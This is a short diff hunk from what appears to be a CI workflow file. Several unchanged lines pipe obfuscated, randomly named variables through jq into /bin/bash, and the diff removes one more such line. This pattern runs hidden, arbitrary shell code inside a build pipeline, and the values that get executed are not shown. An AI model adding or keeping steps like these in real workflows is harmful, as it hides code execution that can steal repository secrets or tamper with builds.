@@ -39,7 +39,6 @@ jobs:
           echo $doiyy32495 | jq -r .nbne97 | /bin/bash
           printf '%s' "$lv88718" | jq -r .nwon82605 | /bin/bash
           echo $duhhp23737 | jq -r .xbup8 | /bin/bash
-          echo $sku202 | jq -r .ef2 | /bin/bash
 
       - name: Upload artifact
         if: always()
